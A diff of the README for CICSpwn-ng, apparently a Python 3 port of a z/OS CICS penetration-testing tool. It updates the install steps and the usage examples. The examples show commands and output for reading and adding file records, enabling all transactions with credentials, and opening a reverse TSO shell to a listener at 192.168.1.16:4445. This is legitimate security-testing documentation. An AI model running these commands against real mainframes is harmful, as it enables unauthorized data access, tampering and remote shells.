@@ -1,5 +1,7 @@
-# CICSpwn
-## Description  
+# CICSpwn-ng
+> This is a Python 3 port of the original [CICSpwn](https://github.com/ayoul3/cicspwn) by [@Ayoul3__](https://github.com/ayoul3), with code cleanup and modernization.
+
+## Description
 CICSpwn is a tool to pentest CICS Transaction servers on z/OS.
 
 ## Features    
@@ -14,7 +16,7 @@ CICSpwn is a tool to pentest CICS Transaction servers on z/OS.
 * Checks security settings on z/OS
 ## Usage
 ```
-$python cicspwn.py -h
+$python3 cicspwn.py -h
 
        ::::::::   :::::::::::   ::::::::    ::::::::   ::::::::: :::       :::::::    ::: 
       :+:    :+:      :+:      :+:    :+:  :+:    :+:  :+:    :+::+:       :+::+:+:   :+: 
@@ -32,7 +34,7 @@ positional arguments:
   IP                    The z/OS Mainframe IP or Hostname
   PORT                  CICS/VTAM server Port
 
-optional arguments:
+options:
   -h, --help            show this help message and exit
   -a APPLID, --applid APPLID
                         CICS ApplID on VTAM, default is CICS
@@ -113,13 +115,16 @@ JOB options:
                         line continuation must be present in the file
 
 ```
-## Prerequisites 
-3270 Python library [py3270](https://pypi.python.org/pypi/py3270/0.2.0)  
-x3270, s3270 or wc3270.exe installed on your sytem  
+## Prerequisites
+Python 3  
+x3270, s3270 or wc3270.exe installed on your system  
+```
+pip3 install -r requirements.txt
+```
 
 ## Getting general information
 ```
-root@kali:~/cics# python cicspwn.py -a CICS 192.168.1.209 23 -i
+root@kali:~/cics# python3 cicspwn.py -a CICS 192.168.1.209 23 -i
 [+] Connecting to target 192.168.1.207:23
 [*] Access to CICS Terminal is possible with APPID CICS
 [+] Getting information about CICS server (APPLID: CICS)
@@ -150,7 +155,7 @@ root@kali:~/cics# python cicspwn.py -a CICS 192.168.1.209 23 -i
 ```
 ## Read a file
 ```
-root@kali:~/cics# python cicspwn.py -a CICS 192.168.1.209 23 --get-file FILEA
+root@kali:~/cics# python3 cicspwn.py -a CICS 192.168.1.209 23 --get-file FILEA
 [+] Connecting to target 192.168.1.207:23
 [*] Access to CICS Terminal is possible with APPID CICS
 [+] Getting Attributes of file FILEA
@@ -163,7 +168,7 @@ Ps: adding --num option fetches only one record
 
 ## Add a record to a file
 ```
-root@kali:~/cics# python cicspwn.py -a CICS 192.168.1.209 23 --add-record FILEA --num ' 400018' --data file.txt
+root@kali:~/cics# python3 cicspwn.py -a CICS 192.168.1.209 23 --add-record FILEA --num ' 400018' --data file.txt
 [[+] Connecting to target 192.168.1.201:23
 [*] Access to CICS Terminal is possible with APPID CICS
 [*] File FILEA is enabled and open
@@ -176,7 +181,7 @@ PS: if record number 400018 exists, CICSpwn updates the record automatically so 
 
 ## List TSQueues
 ```
-root@kali:~/cics# python cicspwn.py -a CICS 192.168.1.209 23 -e
+root@kali:~/cics# python3 cicspwn.py -a CICS 192.168.1.209 23 -e
 [+] Connecting to target 192.168.1.207:23
 [*] Access to CICS Terminal is possible with APPID CICS
 [+] Getting all tsqueues that match *
@@ -190,7 +195,7 @@ TES5	00001	0000000064	CECI
 
 ## Activate ALL transactions
 ```
-root@kali:~/cics# python cicspwn.py 192.168.1.207 23 -a CICS -U AYOUB -P AYOU1 --enable-tran ALL
+root@kali:~/cics# python3 cicspwn.py 192.168.1.207 23 -a CICS -U AYOUB -P AYOU1 --enable-tran ALL
 [+] Connecting to target 192.168.1.207:23
 [*] Access to CICS Terminal is possible with APPID CICS
 [*] Successful authentication
@@ -201,7 +206,7 @@ root@kali:~/cics# python cicspwn.py 192.168.1.207 23 -a CICS -U AYOUB -P AYOU1 -
 
 ## Reverse shell using CICSpwn
 ```
-root@kali:~/cics# python cicspwn.py -a CICS 192.168.1.209 23 -s reverse_tso -l 192.168.1.16:4445
+root@kali:~/cics# python3 cicspwn.py -a CICS 192.168.1.209 23 -s reverse_tso -l 192.168.1.16:4445
 [+] Connecting to target 192.168.1.209:23
 [*] Access to CICS Terminal is possible with APPID CICS
 [+] Setting the current terminal to mixed case
